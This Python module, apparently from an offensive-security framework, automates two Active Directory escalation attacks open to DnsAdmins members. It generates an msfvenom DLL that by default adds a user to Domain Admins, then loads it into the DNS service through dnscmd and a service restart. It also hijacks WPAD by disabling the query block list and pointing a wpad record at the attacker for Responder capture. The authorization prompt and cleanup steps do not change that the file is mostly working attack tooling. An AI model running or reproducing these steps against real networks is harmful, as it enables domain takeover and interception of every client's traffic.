import shutil
import subprocess
from pathlib import Path

from core.target import load_current_profile, get_active_cred
from core.attacker import resolve_lhost
from modules.upload.windows import stage_windows_files, DEFAULT_REMOTE_DIR


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

TARGETS = {
    "plugin": "Malicious plugin DLL (dnscmd + restart)",
    "wpad": "WPAD record + disabled query block list",
}


# ==========================================
# HELPERS
# ==========================================

def _header(target_label):

    print(f"\n{B}┌── MODULE: DNSADMINS " + "─" * 38 + f"┐{W}")
    print(f"{B}│{W} TARGET: {C}{target_label:<50}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True):

    raw = input(f"\n{B}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    hostname = data.get("hostname") or "<DC-HOSTNAME>"
    domain = data.get("domain") or "<DOMAIN>"
    attacker_ip = resolve_lhost(data=data) or "<ATTACKER-IP>"

    default_user = None

    try:
        cred = get_active_cred(data)
        default_user = cred.get("user")
    except Exception:
        pass

    return hostname, domain, attacker_ip, default_user


def _generate_dll(command, filename):

    if not shutil.which("msfvenom"):

        print(f"\n{Y}[!] msfvenom not found on this box — generate it manually:{W}")
        _cmd(f"msfvenom -p windows/x64/exec cmd='{command}' -f dll -o {filename}")

        return None

    print(f"\n{B}[*] Generating {filename} with msfvenom...{W}")

    result = subprocess.run(
        ["msfvenom", "-p", "windows/x64/exec", f"cmd={command}", "-f", "dll", "-o", filename],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0 or not Path(filename).is_file():

        print(f"{R}[-] msfvenom failed:{W}")
        print(result.stderr.strip())

        return None

    print(f"{G}[+] Generated {filename}{W}")

    return Path(filename)


# ==========================================
# PLUGIN DLL
# ==========================================

def _target_plugin(hostname, domain, attacker_ip, default_user, remote):

    #
    # dnscmd/sc/reg all default to the LOCAL machine when no server name is
    # given — only build in a target if we're actually not sitting on the DC.
    #
    dnscmd_target = f"{hostname} " if remote else ""
    sc_target = f"\\\\{hostname} " if remote else ""
    reg_target = f"\\\\{hostname}\\" if remote else ""

    _section("Setup")

    if default_user:

        default_cmd = f'net group "domain admins" {default_user} /add /domain'

        payload_cmd = input(
            f"\n{B}[?]{W} Command for the DLL to run [{C}{default_cmd}{W}]: "
        ).strip() or default_cmd

    else:

        #
        # No active credential to suggest a default — never offer a placeholder
        # as something Enter can silently accept, that just no-ops on target.
        #
        payload_cmd = ""

        while not payload_cmd:
            payload_cmd = input(
                f"\n{B}[?]{W} Command for the DLL to run (no active credential on file — required, "
                f"e.g. net group \"domain admins\" someuser /add /domain): "
            ).strip()

    filename = input(f"{B}[?]{W} DLL filename [{C}adduser.dll{W}]: ").strip() or "adduser.dll"

    dll_path = _generate_dll(payload_cmd, filename)

    if dll_path and _ask(f"Transfer {filename} to the target? [Y/n]: "):
        stage_windows_files([dll_path])

    default_remote = f"{DEFAULT_REMOTE_DIR}\\{filename}"

    remote_path = input(
        f"\n{B}[?]{W} Full path where the DLL will land on the target [{C}{default_remote}{W}]: "
    ).strip() or default_remote

    _section("Execute on target")

    _step(
        1,
        "Confirm DnsAdmins membership",
        "Already flagged by the GROUPS analyzer — this is just the reference command.",
    )
    _cmd("Get-ADGroupMember -Identity DnsAdmins")

    _step(
        2,
        "Point the DNS service at the malicious plugin DLL",
        "Must be a full path — dnscmd silently no-ops on relative paths.",
    )
    _cmd(f"dnscmd.exe {dnscmd_target}/config /serverlevelplugindll {remote_path}")

    _step(3, "Check whether you can restart the DNS service yourself")
    _cmd(
        f"(Get-WmiObject Win32_UserAccount -Filter \"Name='{default_user or '<USER>'}'\").SID",
        f'cmd /c wmic useraccount where name="{default_user or "<USER>"}" get sid',
        f"sc.exe {sc_target}sdshow DNS   # RP (start) / WP (stop) on your SID",
    )

    _step(
        4,
        "Restart the DNS service to load the plugin",
        "Only works if step 3 showed RPWP rights — otherwise wait for a natural service/box restart.",
    )
    _cmd(
        f"sc.exe {sc_target}stop dns",
        f"sc.exe {sc_target}start dns",
    )

    print()
    print(f"    {B}[*]{W} Always sc.exe, never bare sc — sc is a PowerShell alias for Set-Content.")

    _step(5, "Confirm the payload ran")
    _cmd('net group "Domain Admins" /dom')

    print()
    print(f"    {B}[*]{W} Nothing added? Defender likely killed the payload — try a harmless PoC DLL first.")

    _step(6, "Get a fresh session to actually use the new membership")

    runas_user = (
        f"{domain}\\{default_user or '<USER>'}"
        if domain and not domain.startswith("<")
        else (default_user or "<USER>")
    )
    _cmd(f"runas /user:{runas_user} powershell.exe")

    print()
    print(f"    {B}[*]{W} Your old session's token is stale — it won't reflect the new group until relogon.")

    _section("Cleanup — do this, this is destructive and expected to be reverted")

    _step(7, "Remove the plugin registry key and restart DNS cleanly")
    _cmd(
        f"reg query {reg_target}HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters",
        f"reg delete {reg_target}HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll",
        f"sc.exe {sc_target}start dns",
        f"sc.exe {sc_target}query dns   # STATE should read 4  RUNNING",
    )


# ==========================================
# WPAD
# ==========================================

def _target_wpad(hostname, domain, attacker_ip, remote):

    #
    # The DNS Server PowerShell cmdlets also default to the local machine —
    # -ComputerName is only needed when managing DNS from elsewhere.
    #
    computer_arg = f" -ComputerName {hostname}" if remote else ""

    _section("Execute on target")

    _step(
        1,
        "Disable the global query block list",
        "WPAD/ISATAP are blocked by default specifically to prevent this attack.",
    )
    _cmd(f"Set-DnsServerGlobalQueryBlockList -Enable $false{computer_arg}")

    _step(
        2,
        "Add a WPAD record pointing at your attacker box",
        "Every default-configured client resolving WPAD now proxies its traffic through you.",
    )
    _cmd(
        f"Add-DnsServerResourceRecordA -Name wpad -ZoneName {domain}"
        f"{computer_arg} -IPv4Address {attacker_ip}"
    )

    print()
    print(f"    {B}[*]{W} Now run Responder/Inveigh on your attacker box to capture or relay the spoofed traffic.")

    _section("Cleanup — do this, this affects every client on the domain")

    _step(3, "Remove the WPAD record and re-enable the query block list")
    _cmd(
        f"Remove-DnsServerResourceRecord -ZoneName {domain} -RRType A -Name wpad"
        f"{computer_arg} -Force",
        f"Set-DnsServerGlobalQueryBlockList -Enable $true{computer_arg}",
    )


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    hostname, domain, attacker_ip, default_user = _resolve_context()

    target = None

    if hasattr(args, "extra") and args.extra:
        candidate = args.extra[0].lower()
        if candidate in TARGETS:
            target = candidate

    if target is None:

        print(f"\n{B}[*] Choose a technique{W}")

        keys = list(TARGETS.keys())

        for i, key in enumerate(keys, start=1):
            print(f"  {C}[{i}]{W} {TARGETS[key]}")

        raw = input(f"\n{B}[?]{W} Pick a technique [1-{len(keys)}]: ").strip()

        target = keys[int(raw) - 1] if raw.isdigit() and 1 <= int(raw) <= len(keys) else None

    if not target:
        print(f"{R}[-] No technique selected.{W}")
        return

    _header(TARGETS[target])

    print()
    print(f"{R}[!] Destructive action — restarting DNS or hijacking WPAD can take down the domain")
    print(f"    or intercept every client's traffic. Get explicit client authorization first.{W}")

    if not _ask("Confirmed you have authorization to proceed? [y/N]: ", default_yes=False):
        print(f"\n{Y}[!] Aborted.{W}")
        return

    remote = _ask(
        "Running this from a machine other than the DC itself? [y/N]: ",
        default_yes=False,
    )

    if target == "plugin":
        _target_plugin(hostname, domain, attacker_ip, default_user, remote)
    elif target == "wpad":
        _target_wpad(hostname, domain, attacker_ip, remote)
